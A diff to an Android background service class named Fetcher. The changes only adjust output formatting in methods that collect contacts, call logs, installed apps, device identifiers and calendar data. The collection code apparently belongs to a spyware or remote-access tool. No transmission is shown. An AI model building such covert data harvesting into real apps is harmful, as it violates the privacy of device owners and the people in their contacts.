@@ -255,7 +255,7 @@ public class Fetcher extends Service {
                         if (pCur != null) {
                             while (pCur.moveToNext()) {
                                 String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                                info.add("\n ID=>" + id + "\n Name=>" + name + "\n Phone Number" + phoneNumber + "\n");
+                                info.add("\n ID=>" + id + "\n Name=>" + name + "\n Phone Number=>" + phoneNumber + "\n");
                             }
                             pCur.close();
                         }
@@ -297,7 +297,7 @@ public class Fetcher extends Service {
                         dir = "MISSED";
                         break;
                 }
-                logs.add("\n Phone Number=>" + phNumber + "\nType =>" + dir + "\nDate =>" + callDayTime + "\nDuration =>" + callDuration + "\n");
+                logs.add("\n Phone Number=>" + phNumber + "\nType=>" + dir + "\nDate=>" + callDayTime + "\nDuration=>" + callDuration + "\n");
             }
             cursor.close();
         }
@@ -341,7 +341,7 @@ public class Fetcher extends Service {
             PackageInfo packInfo = packList.get(i);
             if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                 String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
-                apps.add("\n ID => " + i + "\n Application => " + appName + "\n");
+                apps.add("\n ID=>" + i + "\n Application=>" + appName + "\n");
             }
         }
         return apps;
@@ -350,20 +350,20 @@ public class Fetcher extends Service {
     // Method to retrieve device information
     private ArrayList<String> deviceInfo() {
         ArrayList<String> info = new ArrayList<>();
-        info.add("\n Serial => " + Build.SERIAL + "\n");
-        info.add("\n Model => " + Build.MODEL + "\n");
-        info.add("\n ID => " + Build.ID + "\n");
-        info.add("\n Manufacturer => " + Build.MANUFACTURER + "\n");
-        info.add("\n Brand => " + Build.BRAND + "\n");
-        info.add("\n Type => " + Build.TYPE + "\n");
-        info.add("\n User => " + Build.USER + "\n");
-        info.add("\n Base => " + Build.VERSION_CODES.BASE + "\n");
-        info.add("\n Incremental => " + Build.VERSION.INCREMENTAL + "\n");
-        info.add("\n SDK => " + Build.VERSION.SDK + "\n");
-        info.add("\n Board => " + Build.BOARD + "\n");
-        info.add("\n Host => " + Build.HOST + "\n");
-        info.add("\n Fingerprint => " + Build.FINGERPRINT + "\n");
-        info.add("\n Release => " + Build.VERSION.RELEASE + "\n");
+        info.add("\n Serial=>" + Build.SERIAL + "\n");
+        info.add("\n Model=>" + Build.MODEL + "\n");
+        info.add("\n ID=>" + Build.ID + "\n");
+        info.add("\n Manufacturer=>" + Build.MANUFACTURER + "\n");
+        info.add("\n Brand=>" + Build.BRAND + "\n");
+        info.add("\n Type=>" + Build.TYPE + "\n");
+        info.add("\n User=>" + Build.USER + "\n");
+        info.add("\n Base=>" + Build.VERSION_CODES.BASE + "\n");
+        info.add("\n Incremental=>" + Build.VERSION.INCREMENTAL + "\n");
+        info.add("\n SDK=>" + Build.VERSION.SDK + "\n");
+        info.add("\n Board=>" + Build.BOARD + "\n");
+        info.add("\n Host=>" + Build.HOST + "\n");
+        info.add("\n Fingerprint=>" + Build.FINGERPRINT + "\n");
+        info.add("\n Release=>" + Build.VERSION.RELEASE + "\n");
         return info;
     }
 
@@ -387,7 +387,7 @@ public class Fetcher extends Service {
                         String name = cursor.getString(0);
                         String displayName = cursor.getString(1);
                         String color = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars.CALENDAR_COLOR));
-                        calendar.add("\n Name => " + name + "\n Display Name => " + displayName + "\n Color => " + color + "\n");
+                        calendar.add("\n Name=>" + name + "\n Display Name=>" + displayName + "\n Color=>" + color + "\n");
                     }
                 }
             } catch (AssertionError e) {
